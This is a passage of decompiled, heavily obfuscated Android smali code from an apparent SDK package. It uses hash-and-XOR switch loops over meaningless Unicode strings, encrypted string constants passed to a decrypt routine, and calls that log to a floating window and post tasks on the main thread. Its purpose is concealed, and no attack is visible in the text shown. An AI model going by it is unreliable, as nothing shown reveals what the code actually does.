    const-string v4, "\u06d8\u06e8\u06d6\u06d8\u06e7\u06df\u06df\u06da\u06e7\u06d8\u06df\u06d8\u06d6\u06d8\u06df\u06d9\u06d9\u06e4\u06e5\u06e1\u06d9\u06eb\u06eb\u06d6\u06df\u06e6\u06d8\u06e6\u06df\u06e6\u06dc\u06d6\u06dc\u06df\u06e1\u06eb\u06dc\u06ec\u06e5\u06da\u06da\u06db\u06d9\u06e8\u06e5\u06d8"

    goto :goto_48

    :sswitch_a4
    const-string v4, "\u06e8\u06e7\u06d6\u06d9\u06e4\u06ec\u06d6\u06ec\u06e2\u06dc\u06e0\u06d6\u06d8\u06e5\u06d6\u06df\u06e2\u06e4\u06d9\u06e0\u06d9\u06d6\u06d8\u06e0\u06eb\u06dc\u06d8\u06d7\u06d6\u06e7\u06e0\u06da\u06d8\u06d8\u06d6\u06d7\u06da\u06e6\u06e1\u06eb\u06e2\u06db\u06e4\u06e5\u06d8\u06d6\u06d8\u06db\u06d9\u06db\u06d9\u06e2\u06ec\u06df\u06df\u06db\u06d6\u06d8"

    goto :goto_47

    :cond_14
    const-string v4, "\u06e8\u06db\u06e1\u06e0\u06e0\u06d6\u06d8\u06ec\u06ec\u06db\u06e1\u06e6\u06d6\u06e2\u06dc\u06d8\u06eb\u06e8\u06d6\u06d8\u06dc\u06e4\u06eb\u06e0\u06d8\u06e6\u06d7\u06ec\u06e1\u06e6\u06e1\u06e4\u06e4\u06dc\u06d6\u06ec\u06db\u06e8\u06d8\u06e2\u06e8\u06e7\u06d8\u06e4\u06df"

    goto :goto_48

    :sswitch_a5
    const-string v4, "\u06e1\u06d7\u06e6\u06e0\u06e4\u06ec\u06d9\u06e6\u06d8\u06e1\u06da\u06d9\u06ec\u06db\u06d8\u06e8\u06e6\u06e6\u06d8\u06eb\u06e6\u06e7\u06d7\u06d9\u06e0\u06e8\u06e1\u06e2\u06e4\u06e1\u06e6\u06d8\u06e8\u06e2\u06e7\u06df\u06da\u06db\u06dc\u06e2\u06dc\u06e5\u06d6\u06e1\u06d8"

    goto :goto_48

    :sswitch_a6
    const-string v4, "\u06db\u06da\u06e4\u06e4\u06ec\u06e8\u06d9\u06df\u06d9\u06e2\u06d9\u06d7\u06e6\u06db\u06d6\u06df\u06e2\u06d9\u06df\u06e5\u06e8\u06d8\u06da\u06e7\u06db\u06d8\u06df\u06dc\u06e5\u06d9\u06e5\u06d8"

    goto :goto_47

    :sswitch_a7
    const-string v4, "\u06df\u06e1\u06e7\u06db\u06d9\u06d8\u06e0\u06dc\u06d8\u06d8\u06db\u06e5\u06d6\u06eb\u06d6\u06eb\u06e1\u06e8\u06d6\u06d8\u06d7\u06e0\u06d9\u06e5\u06e4\u06df\u06e1\u06e6\u06d7\u06da\u06e8\u06d6\u06d8\u06e4\u06e7\u06e8\u06d8\u06da\u06ec\u06d7\u06e4\u06d7\u06dc\u06db\u06ec\u06e0"

    goto :goto_47

    :sswitch_a8
    const v10, -0x55666131

    const-string v4, "\u06d8\u06d7\u06d6\u06da\u06dc\u06dc\u06ec\u06df\u06d8\u06d8\u06eb\u06e7\u06d8\u06ec\u06eb\u06e5\u06d8\u06da\u06d7\u06e5\u06e8\u06d9\u06e7\u06d6\u06e8\u06e6\u06e0\u06e6\u06db\u06e5\u06e7\u06db\u06e7\u06db\u06e1\u06e7\u06e8"

    :goto_49
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v10

    sparse-switch v13, :sswitch_data_32

    goto :goto_49

    :sswitch_a9
    const-string v4, "\u06e7\u06e2\u06e7\u06e8\u06dc\u06d8\u06d8\u06d9\u06db\u06e8\u06ec\u06e8\u06e4\u06db\u06dc\u06d6\u06d8\u06d6\u06eb\u06e7\u06d6\u06e2\u06e6\u06d8\u06e4\u06d8\u06da\u06e2\u06e5\u06d9\u06ec\u06e1\u06eb\u06e5\u06d7\u06d6\u06d8\u06d8\u06db\u06da\u06da\u06eb\u06da\u06e5\u06db\u06df\u06db\u06d6\u06e8\u06d8\u06e6\u06eb\u06e6\u06d8"

    goto :goto_49

    :sswitch_aa
    const-string v4, "\u06e6\u06eb\u06eb\u06dc\u06d6\u06d7\u06ec\u06e8\u06d6\u06d8\u06e4\u06e5\u06e8\u06e4\u06e6\u06d9\u06eb\u06e8\u06e5\u06d8\u06db\u06e0\u06e8\u06d8\u06e7\u06e2\u06d6\u06e2\u06d6\u06d6\u06d8\u06eb\u06ec\u06df\u06da\u06e8\u06e5\u06d8\u06e0\u06da\u06e0\u06e5\u06dc\u06ec\u06e7\u06d8\u06e8\u06e6\u06d8\u06d8\u06d8\u06df\u06d6\u06d8\u06e7\u06e6\u06e6\u06d6\u06e1\u06d7"

    goto :goto_49

    :sswitch_ab
    const v13, -0x3bb92846

    const-string v4, "\u06d9\u06d9\u06e5\u06d8\u06ec\u06d7\u06db\u06d8\u06e4\u06e8\u06d8\u06e0\u06df\u06d9\u06dc\u06e7\u06ec\u06d9\u06d6\u06e7\u06d8\u06e5\u06e5\u06e6\u06dc\u06e4\u06d8\u06e1\u06da\u06e6\u06e1\u06dc\u06df\u06d7\u06d8\u06db\u06e8\u06e1\u06d8\u06e6\u06d8\u06e7\u06d8\u06d7"

    :goto_4a
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v14

    xor-int/2addr v14, v13

    sparse-switch v14, :sswitch_data_33

    goto :goto_4a

    :sswitch_ac
    const-string v4, "\u06d9\u06df\u06ec\u06dc\u06e2\u06d8\u06e1\u06dc\u06db\u06e6\u06d6\u06eb\u06e2\u06d9\u06df\u06da\u06e8\u06d8\u06d9\u06e1\u06e2\u06e7\u06da\u06dc\u06d8\u06e6\u06dc\u06e7\u06d8\u06dc\u06e2\u06d8"

    goto :goto_49

    :cond_15
    const-string v4, "\u06e6\u06e0\u06d7\u06e5\u06e5\u06d6\u06d8\u06e0\u06d8\u06eb\u06e2\u06e1\u06e8\u06d8\u06e2\u06dc\u06da\u06e4\u06eb\u06d7\u06d7\u06e6\u06e6\u06d8\u06d9\u06d6\u06d6\u06d8\u06e7\u06e0\u06e5\u06d8\u06e7\u06e7"

    goto :goto_4a

    :sswitch_ad
    if-nez v2, :cond_15

    const-string v4, "\u06eb\u06e1\u06e1\u06d9\u06e6\u06d9\u06e1\u06dc\u06ec\u06d6\u06d7\u06d8\u06ec\u06e5\u06e6\u06e1\u06d9\u06df\u06db\u06ec\u06e6\u06d8\u06d7\u06e5\u06d9\u06e1\u06e1\u06d6\u06d8\u06da\u06e1\u06d9\u06e5\u06df\u06d9\u06e4\u06db\u06e4\u06d7\u06e0\u06e1\u06df\u06d6\u06dc\u06d8\u06ec\u06ec\u06e4\u06db\u06e7\u06e6"

    goto :goto_4a

    :sswitch_ae
    const-string v4, "\u06e1\u06e0\u06e5\u06d8\u06e0\u06e2\u06e8\u06e7\u06e0\u06d6\u06db\u06ec\u06d9\u06e6\u06ec\u06d7\u06eb\u06e1\u06d8\u06d8\u06e8\u06e7\u06e5\u06d8\u06e6\u06d7\u06e8\u06d8\u06d9\u06e8\u06ec\u06e1\u06d6\u06e2\u06d9\u06e5\u06ec\u06da\u06d8\u06d6\u06d7\u06d6\u06e1\u06d7\u06d8\u06d8\u06d8\u06e1\u06e5\u06d8\u06d7\u06d6\u06e4"

    goto :goto_4a

    :sswitch_af
    const v4, 0x7862dc63

    const-string v2, "\u06e4\u06d8\u06e5\u06d8\u06d8\u06e1\u06d6\u06d8\u06e7\u06e6\u06d9\u06da\u06dc\u06e5\u06d8\u06e7\u06e2\u06e2\u06d9\u06d7\u06e2\u06db\u06d7\u06e6\u06e1\u06e2\u06d7\u06e2\u06e5\u06e6\u06e2\u06e8\u06d8"

    :goto_4b
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v4

    sparse-switch v10, :sswitch_data_34

    goto :goto_4b

    :sswitch_b0
    const v10, -0x6a6deb9c

    const-string v2, "\u06dc\u06df\u06d9\u06df\u06e6\u06e1\u06d8\u06d8\u06ec\u06dc\u06db\u06e4\u06dc\u06d8\u06e5\u06d6\u06e7\u06da\u06e7\u06db\u06eb\u06df\u06df\u06d6\u06d6\u06e0\u06eb\u06ec\u06e8\u06e0\u06e6\u06e6"

    :goto_4c
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v10

    sparse-switch v13, :sswitch_data_35

    goto :goto_4c

    :sswitch_b1
    const-string v2, "\u06e0\u06e5\u06e1\u06da\u06d8\u06e7\u06e5\u06db\u06d9\u06d9\u06e0\u06dc\u06e1\u06d7\u06e4\u06ec\u06d7\u06e6\u06d8\u06e7\u06e0\u06e4\u06d8\u06d8\u06da\u06df\u06df\u06e5\u06d8\u06e7\u06da\u06ec\u06e8\u06e5\u06ec\u06e2\u06d7\u06ec\u06df\u06e4\u06d9\u06d8\u06db\u06df\u06e8\u06d8\u06d8\u06d8\u06d6\u06db\u06ec\u06dc\u06e6\u06e1\u06e0\u06e5\u06e5\u06d8"

    goto :goto_4c

    :sswitch_b2
    const-string v2, "\u06dc\u06e1\u06da\u06e2\u06da\u06d8\u06d8\u06e8\u06e4\u06d8\u06d8\u06df\u06e6\u06ec\u06e1\u06e2\u06da\u06d8\u06eb\u06db\u06eb\u06d9\u06e1\u06d6\u06df\u06e7\u06d8\u06ec\u06e0\u06e7\u06e4\u06e5\u06e4\u06eb\u06ec\u06d9\u06e1\u06e8\u06e0\u06d8\u06e0\u06e8\u06eb\u06e5"

    goto :goto_4b

    :cond_16
    const-string v2, "\u06e7\u06ec\u06da\u06d9\u06e0\u06d6\u06e2\u06e0\u06e1\u06d7\u06eb\u06ec\u06e2\u06d8\u06e7\u06d8\u06e6\u06e5\u06e5\u06e0\u06e5\u06e6\u06d8\u06ec\u06d6\u06e7\u06d8\u06e1\u06e1\u06e4\u06e7\u06d6\u06e7\u06d8\u06e1\u06e2\u06db\u06db\u06e6\u06d8\u06dc\u06d8\u06da\u06db\u06eb\u06db\u06e6\u06e0\u06e7\u06d8\u06df\u06d9"

    goto :goto_4c

    :sswitch_b3
    if-eqz v11, :cond_16

    const-string v2, "\u06df\u06d8\u06d8\u06d8\u06d9\u06d8\u06e7\u06df\u06da\u06e8\u06e0\u06d8\u06e8\u06ec\u06db\u06df\u06e0\u06e6\u06e1\u06da\u06e1\u06e4\u06e8\u06eb\u06e5\u06d8\u06e0\u06d9\u06da\u06d9\u06d9\u06df\u06e6\u06d7\u06d7\u06db\u06d7\u06d8\u06d8"

    goto :goto_4c

    :sswitch_b4
    const-string v2, "\u06da\u06d7\u06e7\u06e5\u06eb\u06db\u06d7\u06ec\u06e5\u06e8\u06d8\u06dc\u06d8\u06d7\u06e2\u06e8\u06dc\u06dc\u06d8\u06d8\u06d7\u06d7\u06ec\u06e8\u06dc\u06d8\u06d8\u06db\u06e2\u06d7\u06df\u06da\u06d9\u06da\u06d7\u06e8\u06ec\u06e7\u06d8\u06e5\u06e5\u06d8\u06da\u06eb\u06dc\u06d8"

    goto :goto_4b

    :sswitch_b5
    const-string v2, "\u06eb\u06dc\u06e0\u06e4\u06d9\u06d6\u06d8\u06e4\u06df\u06da\u06db\u06eb\u06e4\u06e7\u06e5\u06e5\u06e2\u06e1\u06d7\u06e4\u06e1\u06d8\u06e1\u06eb\u06e0\u06ec\u06eb\u06e7\u06db\u06da\u06e1\u06d8"

    goto :goto_4b

    :sswitch_b6
    const v4, -0x14b5bc3a

    const-string v2, "\u06d9\u06e2\u06e6\u06e0\u06df\u06dc\u06df\u06e0\u06e6\u06d8\u06d6\u06e4\u06e8\u06dc\u06e7\u06e6\u06d8\u06e2\u06df\u06d8\u06d8\u06e8\u06d8\u06e4\u06e5\u06db\u06d8\u06d8\u06e5\u06e7\u06e4\u06e7\u06ec\u06e8\u06d8\u06e6\u06e0\u06dc\u06d8\u06d6\u06dc\u06e6\u06d6\u06e5\u06e5\u06d8\u06da\u06da\u06ec\u06e0\u06e6\u06dc\u06e7\u06e6\u06e5"

    :goto_4d
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v4

    sparse-switch v10, :sswitch_data_36

    goto :goto_4d

    :sswitch_b7
    const v10, -0x36627f8d

    const-string v2, "\u06e1\u06d6\u06e8\u06e6\u06eb\u06e6\u06df\u06db\u06e1\u06d8\u06d9\u06d9\u06e0\u06da\u06d7\u06e6\u06d8\u06e4\u06d9\u06e0\u06e0\u06e6\u06d9\u06e4\u06eb\u06d6\u06e0\u06e8\u06e8\u06d8\u06e2\u06e2\u06d6\u06d8\u06da\u06e4\u06e5\u06d8\u06e5\u06e0\u06d8\u06d7\u06e0\u06da\u06d8\u06db\u06df"

    :goto_4e
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v10

    sparse-switch v13, :sswitch_data_37

    goto :goto_4e

    :sswitch_b8
    const/4 v2, 0x1

    if-eq v11, v2, :cond_17

    const-string v2, "\u06e8\u06e0\u06d8\u06d6\u06e1\u06d8\u06db\u06e5\u06e6\u06eb\u06ec\u06e0\u06d6\u06e8\u06e7\u06e0\u06e6\u06ec\u06e0\u06d7\u06d6\u06d8\u06db\u06e4\u06df\u06d8\u06dc\u06da\u06d6\u06ec\u06e1\u06e6\u06e2\u06d6\u06d8\u06d6\u06da\u06e5"

    goto :goto_4e

    :sswitch_b9
    const-string v2, "\u06e5\u06d6\u06e6\u06e7\u06da\u06db\u06ec\u06d6\u06da\u06e2\u06e8\u06e5\u06d6\u06dc\u06e7\u06d8\u06e4\u06da\u06e6\u06ec\u06d6\u06e8\u06df\u06eb\u06db\u06e2\u06e5\u06e2\u06da\u06db\u06db\u06dc\u06e2\u06db\u06e1\u06e8\u06ec\u06e7\u06dc\u06e0\u06d6\u06da\u06eb\u06e2\u06ec\u06eb\u06d9\u06d6\u06e7"

    goto :goto_4d

    :cond_17
    const-string v2, "\u06e0\u06d8\u06e5\u06e2\u06e2\u06e6\u06e4\u06db\u06df\u06e6\u06db\u06e8\u06e8\u06da\u06d9\u06e4\u06e7\u06da\u06e6\u06e1\u06d8\u06e0\u06e4\u06e0\u06ec\u06e2\u06e8\u06e5\u06e7\u06e6\u06d8\u06dc\u06d9\u06e5\u06d8\u06e8\u06d7\u06dc\u06d8\u06ec\u06e6\u06eb\u06e5\u06e8\u06dc\u06d8\u06df\u06d7\u06e8\u06e2\u06e5\u06d9"

    goto :goto_4e

    :sswitch_ba
    const-string v2, "\u06e4\u06d7\u06d8\u06d8\u06e2\u06e8\u06d7\u06e1\u06e5\u06db\u06df\u06e5\u06dc\u06d8\u06d8\u06dc\u06e6\u06d6\u06d6\u06e7\u06e1\u06e5\u06d9\u06d7\u06eb\u06e7\u06e0\u06dc\u06d8\u06e5\u06eb\u06e5\u06d8\u06d6\u06e4\u06d7\u06eb\u06e5\u06d6\u06d8\u06e4\u06e5\u06e5\u06d8\u06e6\u06e1\u06e6\u06d8\u06e0\u06e0\u06d6\u06e5\u06e0\u06e5\u06d8"

    goto :goto_4e

    :sswitch_bb
    const-string v2, "\u06e7\u06d6\u06d9\u06da\u06e1\u06d8\u06d8\u06e0\u06e4\u06e7\u06e4\u06e4\u06e6\u06da\u06e7\u06da\u06e2\u06e0\u06ec\u06e8\u06d6\u06eb\u06e0\u06e0\u06e2\u06e7\u06d7\u06df\u06e8\u06db\u06ec"

    goto :goto_4d

    :sswitch_bc
    const-string v2, "\u06d8\u06e1\u06e7\u06e8\u06df\u06ec\u06dc\u06db\u06d7\u06ec\u06e5\u06d6\u06e1\u06da\u06ec\u06da\u06dc\u06dc\u06e2\u06da\u06e5\u06e1\u06e4\u06e2\u06e4\u06d6\u06e2\u06ec\u06dc\u06e7\u06e6\u06da\u06db\u06e7\u06dc\u06e2\u06e8\u06e0\u06e0\u06da\u06e2\u06d8\u06d8"

    goto :goto_4d

    :sswitch_bd
    const v4, -0x58511c99

    const-string v2, "\u06ec\u06ec\u06df\u06e5\u06d6\u06e5\u06d9\u06d7\u06e5\u06e6\u06e8\u06ec\u06d8\u06e8\u06e2\u06dc\u06e1\u06d8\u06d8\u06ec\u06e5\u06e0\u06e2\u06df\u06e1\u06d8\u06e7\u06da\u06e1\u06e6\u06d8\u06ec\u06e6\u06df\u06e4\u06e6\u06ec"

    :goto_4f
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v4

    sparse-switch v10, :sswitch_data_38

    goto :goto_4f

    :sswitch_be
    const v10, 0x29098cf9

    const-string v2, "\u06eb\u06e8\u06eb\u06db\u06e1\u06e7\u06d7\u06d7\u06d9\u06e2\u06e2\u06e5\u06ec\u06e5\u06dc\u06d8\u06e2\u06df\u06da\u06e8\u06d9\u06d6\u06e2\u06e0\u06df\u06ec\u06e2\u06d6\u06d7\u06e1\u06e0\u06e2\u06db\u06db\u06da\u06e7\u06e8\u06d8\u06e5\u06eb\u06d9\u06dc\u06d8\u06e0"

    :goto_50
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v10

    sparse-switch v13, :sswitch_data_39

    goto :goto_50

    :sswitch_bf
    const-string v2, "\u06d7\u06d7\u06ec\u06d6\u06db\u06d8\u06eb\u06ec\u06db\u06da\u06e0\u06d6\u06dc\u06ec\u06d8\u06da\u06e7\u06d8\u06d8\u06da\u06e2\u06d6\u06df\u06dc\u06e1\u06db\u06e1\u06e1\u06d8\u06e4\u06e5\u06e5\u06ec\u06e7\u06dc\u06d8\u06df\u06d7\u06e4\u06e8\u06e6\u06e6\u06e8\u06d9\u06dc\u06d6\u06e0\u06e4\u06e0\u06da\u06da\u06d6\u06d8\u06d9\u06e7\u06e7\u06e8\u06d8"

    goto :goto_4f

    :sswitch_c0
    const-string v2, "\u06e2\u06db\u06da\u06e0\u06d7\u06e1\u06d8\u06e2\u06e5\u06eb\u06db\u06da\u06d9\u06d9\u06d9\u06d8\u06d8\u06d7\u06d7\u06e6\u06d8\u06e7\u06eb\u06e7\u06df\u06da\u06e8\u06d8\u06e0\u06d6\u06dc\u06d9\u06db\u06d9\u06db\u06df\u06e7\u06da\u06e8\u06e8\u06d8\u06db\u06d9\u06ec\u06eb\u06d9\u06e0"

    goto :goto_4f

    :cond_18
    const-string v2, "\u06eb\u06d9\u06e6\u06d8\u06e0\u06ec\u06dc\u06e2\u06d9\u06d7\u06d6\u06d6\u06d9\u06e2\u06e6\u06df\u06dc\u06e1\u06e6\u06e4\u06d9\u06d6\u06e6\u06e8\u06d6\u06da\u06e2\u06ec\u06eb\u06e1\u06eb\u06db\u06da\u06dc\u06ec\u06e8\u06db\u06e5\u06db\u06eb\u06d6\u06d9\u06e1\u06d8\u06eb\u06d7\u06e5\u06d8\u06e0\u06eb\u06da\u06e7\u06d6\u06e8\u06d8\u06dc\u06e6\u06e6\u06d8"

    goto :goto_50

    :sswitch_c1
    const/4 v2, 0x2

    if-eq v11, v2, :cond_18

    const-string v2, "\u06e4\u06e2\u06d6\u06e8\u06d6\u06e7\u06d8\u06e1\u06e2\u06d6\u06d8\u06d9\u06e0\u06e2\u06e8\u06d7\u06e5\u06d8\u06e5\u06df\u06e7\u06e4\u06d7\u06e8\u06e2\u06e6\u06e5\u06d7\u06db\u06e1\u06d8\u06df\u06e2\u06d6\u06d8\u06dc\u06e7\u06ec\u06da\u06e0\u06df\u06e8\u06e4\u06d9\u06e1\u06db\u06e6\u06d8"

    goto :goto_50

    :sswitch_c2
    const-string v2, "\u06e2\u06d8\u06e4\u06d7\u06df\u06e0\u06e6\u06e6\u06dc\u06df\u06d6\u06dc\u06d8\u06e2\u06e5\u06da\u06df\u06df\u06d8\u06da\u06e7\u06d7\u06da\u06df\u06d6\u06d8\u06dc\u06d9\u06e2\u06db\u06d6\u06d8\u06d9\u06d7\u06e1\u06d8\u06d9\u06df\u06e8\u06d8\u06da\u06d7\u06dc\u06d8\u06e4\u06db\u06df"

    goto :goto_50

    :sswitch_c3
    const-string v2, "\u06d8\u06e1\u06dc\u06d8\u06d6\u06db\u06e5\u06e5\u06d9\u06d7\u06e4\u06d6\u06d6\u06d8\u06db\u06e7\u06e0\u06e2\u06eb\u06e5\u06e6\u06e2\u06e1\u06d8\u06e6\u06dc\u06d8\u06d8\u06d7\u06e6\u06ec\u06ec\u06d8\u06d6\u06d8\u06e6\u06df\u06e0\u06d6\u06e6\u06e7"

    goto :goto_4f

    :sswitch_c4
    const v4, -0x51d28db0

    const-string v2, "\u06e4\u06db\u06e5\u06d8\u06d8\u06e7\u06e5\u06d8\u06e1\u06d8\u06da\u06e2\u06e1\u06d8\u06d6\u06e5\u06e5\u06d8\u06d9\u06dc\u06d8\u06da\u06eb\u06ec\u06e0\u06e8\u06d8\u06db\u06d6\u06dc\u06d8\u06d9\u06ec\u06e5\u06da\u06db\u06e1\u06e2\u06e0\u06db\u06db\u06e7\u06ec\u06db\u06e8\u06d8\u06da\u06d7\u06d8\u06d8\u06d6\u06ec\u06eb\u06e7\u06e1\u06df\u06e4\u06e5\u06e8"

    :goto_51
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v4

    sparse-switch v10, :sswitch_data_3a

    goto :goto_51

    :sswitch_c5
    const-string v2, "\u06e2\u06d8\u06ec\u06e5\u06e1\u06e1\u06db\u06da\u06d6\u06d8\u06e6\u06db\u06d8\u06d8\u06d6\u06e2\u06db\u06e5\u06d8\u06e4\u06e4\u06e2\u06eb\u06e5\u06d8\u06d8\u06e7\u06e5\u06e8\u06e0\u06dc\u06dc\u06d8\u06d9\u06d6\u06e7\u06d8\u06eb\u06e7\u06d6\u06d8\u06db\u06dc\u06e1\u06d8\u06d9\u06db\u06d8\u06d8\u06e4\u06db\u06dc\u06d8\u06e2\u06d9\u06d6\u06d8"

    goto :goto_51

    :sswitch_c6
    const-string v2, "\u06e8\u06d8\u06d6\u06d8\u06e2\u06e6\u06e2\u06db\u06db\u06eb\u06e6\u06e4\u06d9\u06e2\u06e8\u06ec\u06e1\u06df\u06e0\u06db\u06e5\u06e1\u06e5\u06e7\u06ec\u06d8\u06d8\u06d8\u06df\u06da\u06ec\u06e6\u06db\u06e6\u06df\u06e7\u06db\u06e7\u06e6\u06d6\u06e1\u06d7\u06eb\u06d9\u06e1\u06e0\u06ec\u06e2\u06ec\u06e1\u06d8\u06d8\u06d7\u06e1\u06d6"

    goto :goto_51

    :sswitch_c7
    const v10, 0x65165df

    const-string v2, "\u06e6\u06d7\u06e1\u06d8\u06db\u06e0\u06d9\u06d6\u06d6\u06e5\u06db\u06e1\u06e5\u06e1\u06e0\u06e4\u06e4\u06d6\u06da\u06e7\u06e8\u06e8\u06e7\u06d8\u06df\u06db\u06eb\u06df\u06d6\u06d9"

    :goto_52
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v10

    sparse-switch v13, :sswitch_data_3b

    goto :goto_52

    :sswitch_c8
    const/4 v2, 0x3

    if-eq v11, v2, :cond_19

    const-string v2, "\u06e4\u06e6\u06dc\u06e8\u06db\u06e4\u06e5\u06e6\u06e6\u06d8\u06e1\u06d6\u06d6\u06d8\u06e2\u06d8\u06e8\u06df\u06e2\u06d9\u06d8\u06e1\u06d8\u06df\u06e4\u06df\u06d9\u06d8\u06e2\u06da\u06eb\u06e2"

    goto :goto_52

    :cond_19
    const-string v2, "\u06d6\u06e8\u06e7\u06df\u06ec\u06e6\u06d8\u06e7\u06e5\u06e8\u06d8\u06d6\u06d8\u06e2\u06df\u06e6\u06eb\u06d9\u06e8\u06e6\u06d6\u06e7\u06e5\u06d7\u06df\u06eb\u06e7\u06d7\u06e5\u06e1\u06e5\u06e2\u06e4\u06d8\u06d8\u06e7\u06e0\u06dc"

    goto :goto_52

    :sswitch_c9
    const-string v2, "\u06db\u06e0\u06dc\u06da\u06eb\u06e4\u06d8\u06d9\u06d6\u06eb\u06da\u06e2\u06d6\u06e6\u06d8\u06e8\u06e0\u06dc\u06d6\u06d6\u06d7\u06ec\u06e5\u06df\u06d7\u06e7\u06eb\u06eb\u06e4\u06df\u06e4\u06d8\u06d8\u06eb\u06d9\u06ec\u06da\u06e6\u06e2\u06e7\u06e2\u06e1\u06d8\u06e8\u06d8\u06d8\u06d8\u06dc\u06d9\u06da"

    goto :goto_52

    :sswitch_ca
    const-string v2, "\u06e4\u06e4\u06e8\u06d8\u06e5\u06e6\u06e6\u06d7\u06e0\u06ec\u06d8\u06e7\u06d8\u06d7\u06d7\u06e5\u06e0\u06ec\u06df\u06e6\u06e8\u06dc\u06d8\u06d7\u06e2\u06df\u06d8\u06d8\u06d8\u06e5\u06d7\u06e5"

    goto :goto_51

    :sswitch_cb
    :try_start_26
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "I5N2Vu5bb7NNjDMp2zHe6yWxe1bqTg==\n"

    const-string v5, "wQnWuVbUT1Y=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "5eW6HISLOWuwv7lp35ZmCbPv0UKr1EFz\n"

    const-string v5, "Clk2+Tgy3Ow=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "15fMdaE=\n"

    const-string v5, "suW+GtMah9U=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v4

    invoke-direct {v2, v4}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v4, LCu7y/sdk/c5;

    const/4 v5, 0x3

    move-object/from16 v0, p3

    invoke-direct {v4, v5, v0, v12}, LCu7y/sdk/c5;-><init>(ILandroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v2, v4}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v4

    invoke-direct {v2, v4}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v4, LCu7y/sdk/a5;

    const/4 v5, 0x0

    invoke-direct {v4, v5}, LCu7y/sdk/a5;-><init>(I)V

    const-wide/16 v6, 0x5dc

    invoke-virtual {v2, v4, v6, v7}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto/16 :goto_2d

    :catch_6
    move-exception v2

    goto/16 :goto_1f

    :sswitch_cc
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "0/LETty5bkO97YEx6dPfG9XQyU7YrA==\n"

    const-string v10, "MWhkoWQ2TqY=\n"

    invoke-static {v4, v10}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "NmiESGNqJ/xjMoc9OHd4\n"

    const-string v9, "2dQIrd/Twns=\n"

    invoke-static {v4, v9}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "ae7DKUg=\n"

    const-string v9, "DJyxRjp1zeU=\n"

    invoke-static {v4, v9}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v4

    invoke-direct {v2, v4}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v4, LCu7y/sdk/c5;

    const/4 v9, 0x2

    move-object/from16 v0, p3

    invoke-direct {v4, v9, v0, v12}, LCu7y/sdk/c5;-><init>(ILandroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v2, v4}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto/16 :goto_40

    :sswitch_cd
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "IWfil/Yj5s5PeKfow0lXlidF75fyNg==\n"

    const-string v5, "w/1CeE6sxis=\n"

